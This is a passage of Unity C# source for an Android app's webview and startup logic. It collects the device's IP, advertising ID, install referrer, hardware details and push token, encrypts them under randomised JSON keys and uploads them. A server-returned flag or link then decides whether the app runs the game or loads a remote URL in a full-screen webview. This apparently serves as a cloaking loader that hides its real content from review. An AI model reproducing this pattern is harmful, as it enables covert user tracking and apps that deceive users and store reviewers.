            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload payload)
    {
        if (payload == null || payload.Extra == null)
            return null;
        object failingUrlObj;
        if (!payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out failingUrlObj))
            return null;
        return failingUrlObj as string;
    }

    private void OpenFailedUrlExternally(string url)
    {
        if (string.IsNullOrEmpty(url))
            return;
        if (TryOpenExternalLikeChrome(url))
            return;
        OpenUrlExternally(url);
    }

    private bool TryOpenExternalLikeChrome(string url)
    {
        if (string.IsNullOrEmpty(url))
            return false;
        if (url.StartsWith("intent://", StringComparison.OrdinalIgnoreCase))
            return OpenAndroidIntentUrl(url);
        if (IsMarketUrl(url))
            return OpenAndroidMarketUrl(url, null);
        if (!url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase) && !url.StartsWith("about:blank", StringComparison.OrdinalIgnoreCase))
        {
            return OpenAndroidViewUrl(url);
        }

        return false;
    }

    private bool ShouldRecoverExternally(int code, string message, string url)
    {
        if (string.IsNullOrEmpty(url))
            return false;
        if (!IsHttpUrl(url))
            return true;
        if (string.IsNullOrEmpty(message))
            return false;
        return message.IndexOf("ERR_CONNECTION_RESET", StringComparison.OrdinalIgnoreCase) >= 0 || message.IndexOf("ERR_CONNECTION_REFUSED", StringComparison.OrdinalIgnoreCase) >= 0 || message.IndexOf("ERR_CONNECTION_CLOSED", StringComparison.OrdinalIgnoreCase) >= 0 || message.IndexOf("ERR_UNKNOWN_URL_SCHEME", StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private bool OpenUrlExternally(string url)
    {
        return OpenAndroidViewUrl(url);
    }

    private void StopCurrentFailedLoad(UniWebView view)
    {
        ShowSpinner(false);
        if (view == null)
            return;
        view.Stop();
        if (view.CanGoBack)
            view.GoBack();
    }

    private bool OpenAndroidIntentUrl(string url)
    {
        try
        {
            using (var unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
            using (var activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity"))
            using (var pm = activity.Call<AndroidJavaObject>("getPackageManager"))
            using (var intentClass = new AndroidJavaClass("android.content.Intent"))
            using (var intent = intentClass.CallStatic<AndroidJavaObject>("parseUri", url, 1))
            {
                string fallbackUrl = intent.Call<string>("getStringExtra", "browser_fallback_url");
                string packageName = intent.Call<string>("getPackage");
                intent.Call<AndroidJavaObject>("addCategory", "android.intent.category.BROWSABLE");
                intent.Call<AndroidJavaObject>("removeExtra", "browser_fallback_url");
                if (intent.Call<AndroidJavaObject>("resolveActivity", pm) != null)
                {
                    WLog("ChromeLike open intent: " + url);
                    intent.Call<AndroidJavaObject>("addFlags", 0x10000000);
                    activity.Call("startActivity", intent);
                    return true;
                }

                if (LaunchInstalledPackage(packageName))
                    return true;
                if (!string.IsNullOrEmpty(fallbackUrl))
                {
                    WLog("ChromeLike intent fallback: " + fallbackUrl);
                    if (IsMarketUrl(fallbackUrl))
                        return OpenAndroidMarketUrl(fallbackUrl, packageName);
                    return OpenAndroidViewUrl(fallbackUrl);
                }

                WLog("ChromeLike intent no handler: " + url);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog("ChromeLike intent failed: " + e.Message);
            return true;
        }
    }

    private bool OpenAndroidMarketUrl(string url, string intentPackageName)
    {
        string packageName = GetMarketPackage(url);
        if (string.IsNullOrEmpty(packageName))
            packageName = intentPackageName;
        if (LaunchInstalledPackage(packageName))
            return true;
        string webUrl = string.IsNullOrEmpty(packageName) ? "https://play.google.com/store" : "https://play.google.com/store/apps/details?id=" + packageName;
        WLog("ChromeLike market fallback as web: " + webUrl);
        return OpenAndroidViewUrl(webUrl);
    }

    private bool LaunchInstalledPackage(string packageName)
    {
        if (string.IsNullOrEmpty(packageName))
            return false;
        try
        {
            using (var unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
            using (var activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity"))
            using (var pm = activity.Call<AndroidJavaObject>("getPackageManager"))
            using (var launchIntent = pm.Call<AndroidJavaObject>("getLaunchIntentForPackage", packageName))
            {
                if (launchIntent == null)
                    return false;
                WLog("ChromeLike launch installed package: " + packageName);
                launchIntent.Call<AndroidJavaObject>("addFlags", 0x10000000);
                activity.Call("startActivity", launchIntent);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private bool OpenAndroidViewUrl(string url)
    {
        try
        {
            using (var unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
            using (var activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity"))
            using (var uriClass = new AndroidJavaClass("android.net.Uri"))
            using (var uri = uriClass.CallStatic<AndroidJavaObject>("parse", url))
            using (var intent = new AndroidJavaObject("android.content.Intent", "android.intent.action.VIEW", uri))
            {
                WLog("ChromeLike open external: " + url);
                intent.Call<AndroidJavaObject>("addCategory", "android.intent.category.BROWSABLE");
                intent.Call<AndroidJavaObject>("addFlags", 0x10000000);
                activity.Call("startActivity", intent);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog("ChromeLike external failed: " + e.Message);
            Application.OpenURL(url);
            return true;
        }
    }

    private void Open(string url)
    {
        CheckSendId();
        StartCoroutine(OpenInternal(url));
    }

    private IEnumerator OpenInternal(string url)
    {
        if (webViewUni != null && IsCompleted)
            yield break;
        webViewUni = gameObject.AddComponent<UniWebView>();
        ConfigureWebView(webViewUni);
        RegisterWebViewEvents(webViewUni);
        webViewUni.BackgroundColor = Color.clear;
        var rootGOs = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        ApplySafeArea();
        yield return new WaitForEndOfFrame();
        IsCompleted = true;
        EnsureSpinnerBuilt();
        ShowSpinner(true);
        isPrewarming = false;
        googleUserAgentApplied = false;
        openedPopups.Clear();
        lastHandledBackFrame = -1;
        firstLoadShown = false;
        waitingFor100 = false;
        exitShown = false;
        webViewUni.SetUserAgent("");
        loadStartedAt = Time.realtimeSinceStartup;
        webViewUni.Stop();
        webViewUni.Load(url);
        webViewUni.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog("Main WebView Initial Show");
    }

    internal bool isApplicationFocus = false;
    private void OnApplicationFocus(bool focus)
    {
        isApplicationFocus = focus;
        if (focus && IsCompleted)
        {
            CheckSendId();
        }
    }

    internal bool isApplicationPause = false;
    private void OnApplicationPause(bool pause)
    {
        isApplicationPause = pause;
    }

    internal void Update()
    {
        if (webViewUni == null)
            return;
        if (WasBackPressedThisFrame())
            HandleHardwareBack();
        if (!isApplicationFocus || isApplicationPause)
            return;
        ApplySafeArea();
        if (spinnerActive && spinnerRT != null)
            spinnerRT.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private void EnsureSpinnerBuilt()
    {
        if (spinnerRoot != null)
            return;
        var canvas = EnsureCanvas();
        spinnerRoot = new GameObject("WebViewSpinner", typeof(RectTransform), typeof(Text));
        spinnerRT = spinnerRoot.GetComponent<RectTransform>();
        spinnerRT.SetParent(canvas.transform, false);
        spinnerRT.anchorMin = new Vector2(0.5f, 0.5f);
        spinnerRT.anchorMax = new Vector2(0.5f, 0.5f);
        spinnerRT.pivot = new Vector2(0.5f, 0.5f);
        spinnerRT.sizeDelta = new Vector2(600f, 600f);
        spinnerRT.anchoredPosition = Vector2.zero;
        spinnerText = spinnerRoot.GetComponent<Text>();
        spinnerText.text = "/";
        spinnerText.font = Resources.GetBuiltinResource<Font>("LegacyRuntime.ttf");
        spinnerText.fontSize = 200;
        spinnerText.alignment = TextAnchor.MiddleCenter;
        spinnerText.color = Color.white;
        spinnerText.raycastTarget = false;
        spinnerRoot.SetActive(false);
    }

    private void ApplyBlackWebViewBackdrop()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private void ShowSpinner(bool show)
    {
        EnsureSpinnerBuilt();
        spinnerRoot.SetActive(show);
        spinnerActive = show;
        if (show)
        {
            spinnerRoot.transform.SetAsLastSibling();
            if (spinnerRT != null)
                spinnerRT.localRotation = Quaternion.identity;
        }
    }

    internal Button CreateButton(string label, Transform parent)
    {
        var go = new GameObject(label + "Btn", typeof(RectTransform), typeof(Image), typeof(Button));
        var rt = go.GetComponent<RectTransform>();
        rt.SetParent(parent, false);
        var img = go.GetComponent<Image>();
        img.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var btn = go.GetComponent<Button>();
        var colors = btn.colors;
        colors.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        colors.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        btn.colors = colors;
        var txtGO = new GameObject("Text", typeof(RectTransform), typeof(Text));
        var trt = txtGO.GetComponent<RectTransform>();
        trt.SetParent(go.transform, false);
        trt.anchorMin = Vector2.zero;
        trt.anchorMax = Vector2.one;
        trt.offsetMin = trt.offsetMax = Vector2.zero;
        var txt = txtGO.GetComponent<Text>();
        txt.text = label;
        txt.alignment = TextAnchor.MiddleCenter;
        txt.color = Color.black;
        txt.font = Resources.GetBuiltinResource<Font>("Arial.ttf");
        txt.fontSize = 28;
        WLog("CreateButton '" + label + "'");
        return btn;
    }

    internal bool IsGoogleAuthFlowUrl(string u)
    {
        if (string.IsNullOrEmpty(u))
            return false;
        return u.IndexOf("accounts.google.com", StringComparison.OrdinalIgnoreCase) >= 0 || u.IndexOf("accounts.google.", StringComparison.OrdinalIgnoreCase) >= 0 || u.IndexOf("googleusercontent.com", StringComparison.OrdinalIgnoreCase) >= 0 || u.IndexOf("gstatic.com", StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal bool IsHttpUrl(string u)
    {
        if (string.IsNullOrEmpty(u))
            return false;
        return u.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || u.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
    }

    internal bool IsAboutBlank(string u)
    {
        if (string.IsNullOrEmpty(u))
            return false;
        return u.StartsWith("about:blank", StringComparison.OrdinalIgnoreCase);
    }

    internal bool ContainsIgnoreCase(string source, string value)
    {
        if (string.IsNullOrEmpty(source) || string.IsNullOrEmpty(value))
            return false;
        return source.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal bool IsMarketUrl(string url)
    {
        return url.StartsWith("market://", StringComparison.OrdinalIgnoreCase) || url.StartsWith("https://play.google.com/", StringComparison.OrdinalIgnoreCase) || url.StartsWith("http://play.google.com/", StringComparison.OrdinalIgnoreCase);
    }

    internal string GetMarketPackage(string url)
    {
        int idIndex = url.IndexOf("id=", StringComparison.OrdinalIgnoreCase);
        if (idIndex < 0)
            return null;
        string value = url.Substring(idIndex + 3);
        int end = value.IndexOf('&');
        return end >= 0 ? value.Substring(0, end) : value;
    }

    // WEB VIEW LOGIC END
    internal void ShowExitDialog()
    {
        // Ensure channel exists (safe to call multiple times)
        var channel = new AndroidNotificationChannel
        {
            Id = "default_channel",
            Name = "Default Channel",
            Importance = Importance.High,
            Description = "General notifications"
        };
        AndroidNotificationCenter.RegisterNotificationChannel(channel);
        // Build notification
        var notification = new AndroidNotification
        {
            Title = exitLines[UnityEngine.Random.Range(0, exitLines.Length)],
            Text = "Are you sure to exit?",
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(notification, "default_channel");
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> GetMyipFallback()
    {
        var detectorLink = "https://www.cloudflare.com/cdn-cgi/trace";
        using (UnityWebRequest req = UnityWebRequest.Get(detectorLink))
        {
            await req.SendWebRequest();
            string[] lines = req.downloadHandler.text.Split('\n');
            foreach (string line in lines)
            {
                if (line.StartsWith("ip="))
                {
                    string ip = line.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {ip} from {detectorLink}");
                        }
#endif
                    }

                    return ip;
                }
            }
        }

        return "";
    }

    private Task RunCoroutineAsync(IEnumerator coroutine)
    {
        var tcs = new TaskCompletionSource<bool>();
        StartCoroutine(WrapCoroutine(coroutine, tcs));
        return tcs.Task;
    }

    private IEnumerator WrapCoroutine(IEnumerator coroutine, TaskCompletionSource<bool> tcs)
    {
        yield return coroutine;
        tcs.SetResult(true);
    }

    private IEnumerator ReferrerTimeoutCoroutine(float timeoutSeconds)
    {
        yield return new WaitForSeconds(timeoutSeconds);
        if (!gotReferrer)
        {
            gotReferrer = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {installRef}");
                }
#endif
            }
        }
    }

    private IEnumerator InitializeRefferer()
    {
        {
#if B_LOGS
            {
                Debug.Log("[Test] InitializeRefferer ");
            }
#endif
        }

        bool isSkipAdjust = false;
        InstallReferrer.GetReferrer((data) =>
        {
            Debug.Log("[Test Referrer] get → " + installRef);
            if (data.IsSuccess)
            {
                installRef = data.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log("[Test Referrer] Success → " + installRef);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log("[Test Referrer] Failed → " + data);
#endif
                }

                installRef = "";
            }

            gotReferrer = true;
        });
        StartCoroutine(ReferrerTimeoutCoroutine(2f));
        yield return new WaitUntil(() => gotReferrer);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {installRef}");
#endif
        }

        bool hasGclid = installRef.Contains("gclid=");
        isSkipAdjust = hasGclid || installRef.Contains("apps.instagram.com") || installRef.Contains("apps.facebook.com");
        oneLinkData = hasGclid ? "" : (isSkipAdjust ? "" : oneLinkData);
        oneLinkData = oneLinkData ?? "";
        naming = naming ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {oneLinkData}");
#endif
        }
    }

    private string appId = "";
    private string advId = "";
    private string userAgent = "";
    private string myip = "";
    private string sysDevId = "";
    private string toAllowBlockWord = "";
    private string isPrivacyString = "";
    private string emucheckLocal = "";
    private string currentTimeTicks = "";
    private string gpu = "";
    private string cpu = "";
    private bool loadPassSent = false;
    private async Task<bool> LoadIsPrivacyOnPayload(int maxAttempts = 5, int delayMs = 500)
    {
        List<EntityData> queryAsyncResults = new List<EntityData>();
        int attempts = 0;
        do
        {
            try
            {
                queryAsyncResults = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter("playerId", playerId, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { "isPrivacy" }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log("[Test] queryAsyncResults error: " + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(delayMs);
        }
        while (queryAsyncResults.Count == 0 && attempts++ < maxAttempts);
        {
#if B_LOGS
            {
                Debug.Log("[Test] IsPrivacy Query results: " + JsonConvert.SerializeObject(queryAsyncResults, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log("[Test] IsPrivacy Query results count: " + queryAsyncResults.Count);
            }
#endif
        }

        bool isPrivacy = true;
        if (queryAsyncResults.Count == 0)
        {
            isPrivacy = false;
        }
        else
        {
            isPrivacy = queryAsyncResults.Any(entity => entity.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log("[Test] IsPrivacy result: " + isPrivacy);
            }
#endif
        }

        return isPrivacy;
    }

    private static bool IsPrivacyItemTrue(Item item)
    {
        if (item.Key != "isPrivacy")
            return false;
        try
        {
            var raw = item.Value.GetAs<object>();
            return raw switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private async Task SendClickFirstRun()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        isPrivacyString = "false";
        emucheckLocal = /*IsRunningOnEmulator() ? "running" :*/ "";
        currentTimeTicks = DateTime.UtcNow.Ticks.ToString();
        toAllowBlockWord = "";
        JObject payloadObj = BuildRandomPayload(appId, adjId, advId, pushToken, installRef, oneLinkData, naming, userAgent, myip, sysDevId, isPrivacyString, toAllowBlockWord, devModel, appVersion, installMode.ToString(), installerStore, currentTimeTicks, emucheckLocal, playerId, gpu, cpu, timestamp_1, GetElapsedTimeStamp());
        var encryptedPayload = Encrypt(payloadObj.ToString(), playerId);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {payloadObj}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { "payload" + playerId, encryptedPayload } });
            await Task.Delay(500);
            string savedLink = "";
            for (int i = 0; i < 20; i++)
            {
                if (await LoadIsPrivacyOnPayload(1, 1))
                {
                    await ReportLoadTotal("blocked");
                    LaunchGame();
                    return;
                }

                savedLink = await LoadSavedLink(1, 500);
                if (!string.IsNullOrEmpty(savedLink))
                    break;
            }

            CheckUrl(savedLink);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log("[TEST] General error: " + e.Message);
#endif
            }

            LaunchGame();
        }
    }

    private async Task ReportLoadTotal(string totalValue)
    {
        if (loadPassSent || string.IsNullOrEmpty(playerId) || string.IsNullOrEmpty(totalValue) || isLoadedFromSaved)
            return;
        loadPassSent = true;
        try
        {
            JObject payloadObj = BuildRandomPayload(totalValue, playerId, GetElapsedTimeStamp());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {totalValue} payload: {payloadObj}");
                }
#endif
            }

            var encryptedPayload = Encrypt(payloadObj.ToString(), playerId);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { "load" + playerId, encryptedPayload } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log("[TEST] Load pass error: " + e.Message);
#endif
            }
        }
    }

    private void CheckUrl(string decrypted)
    {
        bool hasFinalUrl = !string.IsNullOrEmpty(decrypted);
        if (hasFinalUrl)
        {
            {
#if B_LOGS
                Debug.Log("[Test] Show: " + decrypted);
#endif
            }

            Open(decrypted);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log("[Test] Fallback → Game (no final URL)");
#endif
            }

            LaunchGame();
            return;
        }
    }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string Encrypt(string text, string key)
    {
        try
        {
            using var aes = Aes.Create();
            aes.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(key));
            aes.GenerateIV();
            using var ms = new MemoryStream();
            ms.Write(aes.IV, 0, aes.IV.Length);
            using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var bytes = Encoding.UTF8.GetBytes(text);
                cs.Write(bytes, 0, bytes.Length);
                cs.FlushFinalBlock();
            }

            return Convert.ToBase64String(ms.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string Decrypt(string encrypted, string key)
    {
        try
        {
            var data = Convert.FromBase64String(encrypted);
            using var aes = Aes.Create();
            aes.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(key));
            var iv = new byte[16];
            Buffer.BlockCopy(data, 0, iv, 0, 16);
            aes.IV = iv;
            using var ms = new MemoryStream(data, 16, data.Length - 16);
            using var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
            using var sr = new StreamReader(cs, Encoding.UTF8);
            return sr.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string RandomKey()
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        System.Random rnd = new System.Random();
        int len = rnd.Next(8, 16);
        return new string (Enumerable.Repeat(chars, len).Select(s => s[rnd.Next(s.Length)]).ToArray());
    }

    private string GetElapsedTimeStamp()
    {
        float elapsed = Time.realtimeSinceStartup;
        if (elapsed < 0f)
            elapsed = 0f;
        int totalMs = (int)(elapsed * 1000f);
        int mm = totalMs / 60000;
        int ss = (totalMs / 1000) % 60;
        int ms = totalMs % 1000;
        return string.Format("{0:00}:{1:00}:{2:000}", mm, ss, ms);
    }

    private JObject BuildRandomPayload(params string[] values)
    {
        JObject obj = new JObject();
        foreach (var v in values)
        {
            string key = RandomKey();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={key} val={v}");
#endif
            }

            obj.Add(key, v == null ? "" : v);
        }

        return obj;
    }
}